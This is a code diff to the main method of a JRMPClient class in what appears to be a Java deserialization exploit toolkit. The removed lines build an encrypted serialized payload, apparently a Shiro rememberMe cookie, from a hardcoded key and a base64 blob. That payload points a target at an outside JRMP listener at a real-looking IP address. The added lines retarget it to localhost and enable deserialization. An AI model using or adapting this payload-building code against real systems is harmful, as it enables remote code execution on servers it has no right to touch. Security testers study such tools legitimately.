@@ -85,17 +85,9 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
 
 
     public static void main(final String[] args1) throws Exception {
-        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
-        String[] args = new String[]{"207.148.67.145:22324"};
-        PayloadRunner.runDeserialize = false;
+        String[] args = new String[]{"127.0.0.1:9999"};
+        PayloadRunner.runDeserialize = true;
         PayloadRunner.run(JRMPClient.class, args);
-
-        String key = "wR&_(NVG#c&9(CDhaDMZELDmxSe(mwbB";
-        key = new Md5Hash(key).toString();
-        String b64SerializeData = "rO0ABXNyABlzdW4ucm1pLnNlcnZlci5VbmljYXN0UmVmcpuh8Z2PTgIMAAB4cHcrAA4yMDcuMTQ4LjY3LjE0NQAAVzT/////zCO93QAAAAAAAAAAAAAAAAAAAHg=";
-        ByteSource byteSource1 = encrypt(Base64.getDecoder().decode(b64SerializeData),
-            key.getBytes());
-        System.out.println(byteSource1.toBase64());
     }
 
 
